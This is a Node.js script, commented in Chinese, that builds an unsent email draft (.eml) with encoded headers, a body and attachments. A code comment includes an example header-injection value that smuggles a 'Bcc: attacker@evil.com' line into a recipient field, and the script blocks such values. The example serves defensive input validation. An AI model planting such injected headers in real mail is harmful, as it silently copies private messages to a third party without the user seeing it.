#!/usr/bin/env node
/**
 * gen-eml.mjs —— 纯 std（零 npm 依赖）写一封**真邮件草稿 .eml**（Outlook / Foxmail / 网易邮箱大师
 * / Windows 邮件 双击就能打开，收件人/主题/正文/附件全部预填好，客户看一眼点发送即可）。
 *
 * ★ 本包**只写草稿、不发信**。发不发、发给谁，是客户按下发送键那一刻决定的 ——
 *   AI 替人把邮件发出去是不可撤回的对外动作，做错一次就是事故。
 *
 * 用法：
 *   node gen-eml.mjs --in mail.json --out 催款函.eml --json
 *   node gen-eml.mjs --in mail.json --out 催款函.eml --open --json    # 顺手用默认邮件客户端打开
 *
 * mail.json：
 * {
 *   "from":    "我 <me@corp.com>",              // 可省；省了由邮件客户端填默认账号
 *   "to":      ["张经理 <zhang@abc.com>"],       // 字符串或数组
 *   "cc":      ["cc@abc.com"],
 *   "subject": "关于 3 月货款的付款提醒",
 *   "text":    "张经理您好：\n\n……",              // 纯文本正文（必填）
 *   "html":    "<p>张经理您好：</p>",             // 可选，给了就出 multipart/alternative
 *   "attachments": ["对账单.xlsx", "合同扫描件.pdf"]
 * }
 *
 * 输出：`{"ok":true,"file":"…eml","size":N,"attachments":N}`。
 */
import fs from "node:fs";
import path from "node:path";
import { execFile } from "node:child_process";

function parseArgs(argv) {
  const a = {};
  for (let i = 0; i < argv.length; i++) {
    const t = argv[i];
    if (t.startsWith("--")) { const k = t.slice(2); a[k] = argv[i + 1] && !argv[i + 1].startsWith("--") ? argv[++i] : true; }
  }
  return a;
}
const args = parseArgs(process.argv.slice(2));
const asJson = !!args.json;
function fail(m) { if (asJson) console.log(JSON.stringify({ ok: false, error: String(m) })); else console.error("[gen-eml] 失败:", m); process.exit(1); }

let m;
try {
  if (args.in) m = JSON.parse(fs.readFileSync(String(args.in), "utf8"));
  else fail("需要 --in <mail.json>");
} catch (e) { fail("读 mail.json 失败: " + e.message); }
if (!m.subject) fail("缺 subject（主题）");
if (!m.text) fail("缺 text（正文纯文本）——只给 html 的邮件会被很多网关判成垃圾邮件");
if (!m.to || (Array.isArray(m.to) && !m.to.length)) fail("缺 to（收件人）");

// ---------- 🔴 邮件头护栏：值里的 CR/LF 一律拒绝 ----------
// 头部是「一行一个头」的格式，值里混进 CRLF 就等于凭空多出一个**真实生效**的头：
//   to: "victim@abc.com\r\nBcc: attacker@evil.com"
// 生成的 .eml 里那行 `Bcc:` 是真头不是文本，配合 X-Unsent:1，Outlook/Foxmail 会以草稿
// 打开并带上这个密送 —— 用户在 To 栏里看不出任何异常，点发送就抄给了第三方。
//
// 本包的定位就是让 AI 从文档/网页里提取信息填 mail.json，**收件人来自不可信文本是常态**。
// 主题字段以前「碰巧安全」（base64 把 CRLF 编成惰性的 DQo），但那是编码的副作用不是防护：
// 纯 ASCII 主题不走 base64，照样能注入。所以在**入口**拦，不指望下游编码顺手挡住。
//
// 选择报错而不是静默剥掉：静默剥掉会把 `a@b.comBcc: x@evil.com` 当成一个地址发出去，
// 用户既没得到想要的结果，也不知道发生过什么。
const HDR_CTL = /[\x00-\x08\x0A-\x1F\x7F]/; // \x09(tab) 是 RFC5322 合法的折行空白，放行
function hdrGuard(s) {
  if (HDR_CTL.test(s)) {
    fail(
      `邮件头里有换行或控制字符，拒绝生成：${JSON.stringify(s.slice(0, 80))}` +
        " —— 邮件头一行一个头，值里的换行会变成一个真实生效的新头（如 Bcc:），" +
        "收件人在邮件客户端界面上看不出来。请先把收件人/主题里的换行去掉。"
    );
  }
  return s;
}

// ---------- RFC 2047 编码字（中文主题/显示名必须编码，否则各家客户端各自乱码） ----------
const b64 = (s) => Buffer.from(s, "utf8").toString("base64");
function encWord(s) {
  const str = hdrGuard(String(s));
  if (!/[^\x00-\x7F]/.test(str)) return str;
  // 按 UTF-8 字节切段（每个编码字 ≤75 字符），避免把一个汉字劈成两半
  const out = [];
  let cur = "";
  for (const ch of str) {
    if (Buffer.byteLength(cur + ch, "utf8") > 36) { out.push(`=?UTF-8?B?${b64(cur)}?=`); cur = ""; }
    cur += ch;
  }
  if (cur) out.push(`=?UTF-8?B?${b64(cur)}?=`);
  return out.join("\r\n ");
}
/** `张三 <a@b.com>` → 显示名编码、地址原样；纯地址原样返回。 */
function encAddr(a) {
  // 🔴 这里必须先过 hdrGuard：无尖括号时下面直接 `return s` 原样返回，
  // 有尖括号时 `mm[2]`（地址本体）也不经过 encWord —— 两条路径都到不了那道闸。
  const s = hdrGuard(String(a).trim());
  const mm = s.match(/^(.*?)\s*<([^>]+)>$/);
  if (!mm) return s;
  const name = mm[1].replace(/^"|"$/g, "");
  return name ? `${encWord(name)} <${mm[2]}>` : `<${mm[2]}>`;
}
const addrList = (v) => (Array.isArray(v) ? v : [v]).filter(Boolean).map(encAddr).join(", ");

// ---------- 正文编码：一律 base64，绕开 quoted-printable 的软换行/行长坑 ----------
function b64Body(s) { return (b64(s).match(/.{1,76}/g) || []).join("\r\n"); }

const MIME = {
  ".pdf": "application/pdf", ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  ".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  ".pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
  ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg", ".gif": "image/gif", ".svg": "image/svg+xml",
  ".zip": "application/zip", ".csv": "text/csv", ".txt": "text/plain", ".dxf": "image/vnd.dxf",
};

// 分隔串不含 base64 字母表以外的歧义字符，且加固定前缀防撞
const bAlt = "----=_UKing_Alt_" + Buffer.from(String(m.subject)).toString("hex").slice(0, 16);
const bMix = "----=_UKing_Mix_" + Buffer.from(String(m.subject)).toString("hex").slice(0, 16);

const atts = [];
for (const f of m.attachments || []) {
  const p = path.resolve(String(f));
  if (!fs.existsSync(p)) fail(`附件不存在: ${f} —— 附件路径错了发出去就是空手承诺，先把文件生成好再写邮件`);
  atts.push({ p, name: path.basename(p), type: MIME[path.extname(p).toLowerCase()] || "application/octet-stream" });
}

const L = [];
// Date 用本地时区偏移的 RFC5322 格式
const d = new Date();
const tzo = -d.getTimezoneOffset();
const tz = (tzo >= 0 ? "+" : "-") + String(Math.floor(Math.abs(tzo) / 60)).padStart(2, "0") + String(Math.abs(tzo) % 60).padStart(2, "0");
const DOW = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"], MON = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
L.push(`Date: ${DOW[d.getDay()]}, ${d.getDate()} ${MON[d.getMonth()]} ${d.getFullYear()} ${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")} ${tz}`);
if (m.from) L.push(`From: ${encAddr(m.from)}`);
L.push(`To: ${addrList(m.to)}`);
if (m.cc) L.push(`Cc: ${addrList(m.cc)}`);
if (m.bcc) L.push(`Bcc: ${addrList(m.bcc)}`);
L.push(`Subject: ${encWord(m.subject)}`);
L.push("MIME-Version: 1.0");
L.push("X-Unsent: 1"); // Outlook 据此把 .eml 当「未发送草稿」打开，直接可编辑可发送

function bodyPart() {
  if (!m.html) return [`Content-Type: text/plain; charset=UTF-8`, "Content-Transfer-Encoding: base64", "", b64Body(m.text)];
  return [
    `Content-Type: multipart/alternative; boundary="${bAlt}"`, "",
    `--${bAlt}`, "Content-Type: text/plain; charset=UTF-8", "Content-Transfer-Encoding: base64", "", b64Body(m.text), "",
    `--${bAlt}`, "Content-Type: text/html; charset=UTF-8", "Content-Transfer-Encoding: base64", "", b64Body(m.html), "",
    `--${bAlt}--`,
  ];
}

if (!atts.length) {
  L.push(...bodyPart());
} else {
  L.push(`Content-Type: multipart/mixed; boundary="${bMix}"`, "");
  L.push(`--${bMix}`);
  L.push(...bodyPart());
  for (const a of atts) {
    const data = fs.readFileSync(a.p).toString("base64");
    L.push("", `--${bMix}`);
    L.push(`Content-Type: ${a.type}; name="${encWord(a.name)}"`);
    L.push(`Content-Disposition: attachment; filename="${encWord(a.name)}"`);
    L.push("Content-Transfer-Encoding: base64", "");
    L.push((data.match(/.{1,76}/g) || []).join("\r\n"));
  }
  L.push("", `--${bMix}--`);
}

const eml = L.join("\r\n") + "\r\n";
const out = String(args.out || "邮件.eml");
try {
  fs.mkdirSync(path.dirname(path.resolve(out)), { recursive: true });
  fs.writeFileSync(out, eml, "utf8");
} catch (e) { fail("写 .eml 失败: " + e.message); }

if (args.open) {
  const abs = path.resolve(out);
  if (process.platform === "win32") execFile("cmd", ["/c", "start", "", abs], () => {});
  else if (process.platform === "darwin") execFile("open", [abs], () => {});
  else execFile("xdg-open", [abs], () => {});
}

const abs = path.resolve(out);
if (asJson) console.log(JSON.stringify({ ok: true, file: abs, size: Buffer.byteLength(eml), attachments: atts.length, sent: false, note: "只生成草稿，未发送——由用户在自己的邮件客户端里点发送" }));
else console.log(abs);
